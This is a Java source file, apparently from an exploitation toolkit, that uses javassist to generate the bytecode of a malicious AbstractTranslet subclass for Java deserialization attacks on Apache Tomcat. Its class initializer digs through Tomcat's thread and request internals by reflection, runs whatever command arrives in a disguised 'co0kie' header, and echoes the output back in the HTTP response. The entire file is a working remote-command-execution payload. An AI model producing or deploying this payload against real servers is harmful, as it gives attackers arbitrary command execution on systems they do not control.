package payloads.echo;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.coyote.RequestInfo;

public class TomcatEcho {

    // 这里应该需要设置一下区分操作系统吧？
    public static byte[] tomcatEchoPayload() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));

        CtClass ctClass = classPool.makeClass("tomcatEcho" + System.nanoTime());
        ctClass.setSuperclass(classPool.getCtClass(AbstractTranslet.class.getName()));
        ctClass.addMethod(CtMethod.make("    public static Object getField(Object obj,String fieldName) throws Exception{\n" +
                "        java.lang.reflect.Field f0 = null;\n" +
                "        Class clas = obj.getClass();\n" +
                "\n" +
                "        while (clas != Object.class){\n" +
                "            try {\n" +
                "                f0 = clas.getDeclaredField(fieldName);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e){\n" +
                "                clas = clas.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (f0 != null){\n" +
                "            f0.setAccessible(true);\n" +
                "            return f0.get(obj);\n" +
                "        }else {\n" +
                "            throw new NoSuchFieldException(fieldName);\n" +
                "        }\n" +
                "    }",ctClass));

        String method = "        try {\n" +
                "            boolean flag = false;\n" +
                "            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),\"threads\");\n" +
                "            for (int i=0;i<threads.length;i++){\n" +
                "                Thread thread = threads[i];\n" +
                "                if (thread != null){\n" +
                "                    String threadName = thread.getName();\n" +
                "                    if (!threadName.contains(\"exec\") && threadName.contains(\"http\")){\n" +
                "                        Object target = getField(thread,\"target\");\n" +
                "                        Object global = null;\n" +
                "                        if (target instanceof Runnable){\n" +
                "                            // 需要遍历其中的 this$0/handler/global\n" +
                "                            // 需要进行异常捕获，因为存在找不到的情况\n" +
                "                            try {\n" +
                "                                global = getField(getField(getField(target,\"this$0\"),\"handler\"),\"global\");\n" +
                "                            } catch (NoSuchFieldException fieldException){\n" +
                "                                fieldException.printStackTrace();\n" +
                "                            }\n" +
                "                        }\n" +
                "                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors\n" +
                "                        if (global != null){\n" +
                "                            java.util.List processors = (java.util.List) getField(global,\"processors\");\n" +
                "                            for (i=0;i<processors.size();i++){\n" +
                "                                org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) processors.get(i);\n" +
                "                                if (requestInfo != null){\n" +
                "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,\"req\");\n" +
                "                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
                "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                "                                    String cmd = null;\n" +
                "                                    // 从 header 中获取\n" +
                "                                    if (request.getHeader(\"co0kie\") != null){\n" +
                "                                        cmd = request.getHeader(\"co0kie\");\n" +
                "                                    }\n" +
                "\n" +
                "                                    if (cmd != null){\n" +
                "                                        java.io.InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                "                                        StringBuilder sb = new StringBuilder(\"\");\n" +
                "                                        byte[] bytes = new byte[1024];\n" +
                "                                        int n = 0 ;\n" +
                "                                        while ((n=inputStream.read(bytes)) != -1){\n" +
                "                                            sb.append(new String(bytes,0,n));\n" +
                "                                        }\n" +
                "\n" +
                "                                        java.io.Writer writer = response.getWriter();\n" +
                "                                        writer.write(\"$$$\\n\");\n" +
                "                                        writer.write(sb.toString());\n" +
                "                                        writer.write(\"$$$\\n\");\n" +
                "                                        writer.flush();\n" +
                "                                        inputStream.close();\n" +
                "                                        flag = true;\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                    if (flag){\n" +
                "                                        break;\n" +
                "                                    }\n" +
                "                                }\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "                if (flag){\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";
        ctClass.makeClassInitializer().insertBefore(method);
//        ctClass.writeFile(".");
        byte[] bytes = ctClass.toBytecode();
        return bytes;
    }

    public static void main(String[] args) throws Exception {
        TomcatEcho.tomcatEchoPayload();
    }
}
